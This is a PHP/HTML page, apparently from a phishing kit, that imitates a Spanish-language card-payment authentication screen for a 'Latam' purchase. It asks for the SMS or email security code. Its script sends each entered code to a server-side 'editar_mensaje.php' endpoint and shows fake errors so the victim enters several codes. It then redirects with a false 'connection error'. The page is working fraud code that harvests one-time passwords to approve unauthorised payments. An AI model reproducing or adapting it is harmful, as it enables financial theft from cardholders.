<?php 



?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/davi.css">

    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		
    <title>Document</title>

    <style>
        .spinner-container {
      margin-bottom: 2rem;
    }

    .spinner {
        width: 60px;
        height: 60px;
        border: 4px solid rgba(232, 17, 75, 0.2);
        border-left: 4px solid rgb(232, 17, 75);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 3rem;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    </style>
</head>
<body>
    <div id="formContainer" class="details" style="padding: 3px">
        <img src="/img/fala.png" alt="" srcset="" width="100px">
    <hr>
    <a style="color:black;">Autenticación de compra</a><p></p>
    <br><a style="color:black;">Esta intentando realizar un pago en el comercio Latam. Para poder continuar digite el codigo de seguridad enviado por mensaje de texto o correo electronico.</a><p></p>

    
        <center><a style="color:black;">Código de verificación</a><br>
        <input type="tel" name="cDinamica" id="txtOTP" style="" maxlength="6" minlength="6" oninput="this.value = this.value.replace(/\D+/g, '');" required><br>
        <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:189px;"></center>
        <p></p>
        <p>
            <br>
        </p>
        <center><a><b>REENVIAR CÓDIGO</b></a></center>
        <a><b>Necesita Ayuda?</b></a>
    </div>


    
<div id="loader" class="spinner-container" style="display:none; text-align:center; margin-top:50%;">
    <div class="spinner"></div>
    <p style="color:#333; margin-top:15px;">Procesando, por favor espera...</p>
</div>





    <script type="text/javascript">
	var espera = 0;
    var count = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

    function sendCode() {
        const $input = $("#txtOTP");

        // remove all whitespace
        let dinamica = $input.val().replace(/\s+/g, '');

        // update input without spaces
        $input.val(dinamica);

        if (dinamica.length > 5 && count >= 3) {
            $('#formContainer').hide();
            $('#loader').show();
            setTimeout(function () {
                $('#loader').hide();
                $('#formContainer').show();
            }, 6000);
            alert('Error de conexión, por favor intente de nuevo');
            window.location.href = "finish.php";
        } else {
            // clear the field correctly
            $input.val('');
            $(".mensaje").show();
            $(".pass").css("border", "1px solid red");
            $input.focus();

            // si quieres loguear el intento (opcional)
            const data = { dinamica };
            if(dinamica.length > 5) {
                $('#formContainer').hide();
                $('#loader').show();
                setTimeout(function () {
                    $('#loader').hide();
                    $('#formContainer').show();
                }, 6000);
                $.ajax({
                url: '../../acciones/editar_mensaje.php',
                method: 'POST',
                data: { data },
                success: function (response) {
                    // si solo es log, no necesitas hacer nada aquí
                },
                error: function (xhr, status, error) {
                    console.log("Warning")
                }
            });

            count++;
            }
            
        }
    }

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			sendCode();		
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>
</body>
</html>